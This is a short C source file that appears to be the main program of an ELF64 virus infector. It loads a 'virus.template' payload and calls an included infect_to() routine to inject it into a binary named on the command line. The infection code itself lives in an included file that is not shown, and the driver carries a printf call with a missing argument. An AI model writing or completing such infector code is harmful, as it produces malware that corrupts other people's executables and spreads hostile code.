#include "lib/lib.c"
#include "lib/infect.c"

int usage(char *name){
	print("usage: ./");
	print(name);
	print(" binary\n\nnote: the binary must be in elf64\n");
	return -1;
}

void test(){
	println("TEST MALLOC");
	char *x = malloc(12);
	x[0] = 'a';
	x[1] = '\0';
	println(x);
	
	println("TEST FGET");
	char *s; size_t n;
	fget("Makefile", &s, &n);
	println(s);
	println("DONE");

	println("TEST FPUT");
	println("(creating a JOJO.txt)");
	char *xx = "WESH LES COUSINS!!"; 
	fput("JOJO.txt", xx, slen(xx));
}

int main(int ac, char **av){

	printf("start:%zu\n");
	if (ac < 2){
		return usage(av[0]);
	}
	char *template; size_t n;
	fget("bin/virus.template", &template, &n);
	infect_to(av[1], "out.bin", template, n);
	printnb(12222);

	
	return 0;
}
